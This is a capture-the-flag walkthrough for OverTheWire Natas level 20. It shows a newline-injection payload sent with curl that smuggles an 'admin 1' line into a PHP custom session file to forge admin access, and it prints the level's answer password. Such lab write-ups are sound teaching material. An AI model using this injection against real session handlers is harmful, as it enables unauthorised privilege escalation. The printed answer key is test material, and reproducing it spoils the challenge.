# Natas Level 20 → 21

## Goal

The session handler for this level writes the session data to disk using a custom `key value` per line format, and on read it **happily parses any line it sees** — including lines you've smuggled in via newline injection in your user-controlled `name` field.

## Concepts you'll learn

- How session files are structured on disk when a custom handler is in use
- Newline injection: if user input lands in a line-oriented format, `\n` lets you start a new "line" and add your own keys
- Forging an `admin=1` session entry without any crypto work

## Walkthrough

### 1. View the source

Relevant snippets:

```php
function myread($sid) {
    debug("Reading...");
    $data = file_get_contents("/var/lib/php/sessions/mysess_$sid");
    // parse each line "key value"
    foreach(explode("\n", $data) as $line) {
        if(strlen($line) > 0 && preg_match("/^(\w+) (.+)$/", $line, $matches)) {
            $_SESSION[$matches[1]] = $matches[2];
        }
    }
}

function mywrite($sid, $data) {
    // ...
}

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    ...
}

if($_SESSION['admin'] == 1) {
    print "The password for natas21 is <censored>";
}
```

The session file is a list of `key value` lines. When you submit a `name`, it's stored as `name <your name>\n`. If your name contains a literal newline followed by `admin 1`, two session keys get written on the next read.

### 2. Inject

Submit `name` containing an embedded newline:

```
foo
admin 1
```

Use `curl` — it's the cleanest way to get a real `\n` in there:

```bash
$ curl -u natas20:<pass> -c cookies.txt -b cookies.txt \
       --data-urlencode $'name=foo\nadmin 1' \
       http://natas20.natas.labs.overthewire.org/index.php
```

`-c` and `-b` persist cookies so the session handler reads your session.

Now reload the page:

```bash
$ curl -u natas20:<pass> -b cookies.txt http://natas20.natas.labs.overthewire.org/index.php
```

The session file on disk now looks like:

```
name foo
admin 1
```

The read loop sets `$_SESSION["admin"] = "1"`, the admin check passes, and the response includes:

```
IFekPyrQXftziDEsUr3x21sYuahypdgJ
```

## The answer

The password for `natas21` is:

**`IFekPyrQXftziDEsUr3x21sYuahypdgJ`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <http://natas20.natas.labs.overthewire.org/>
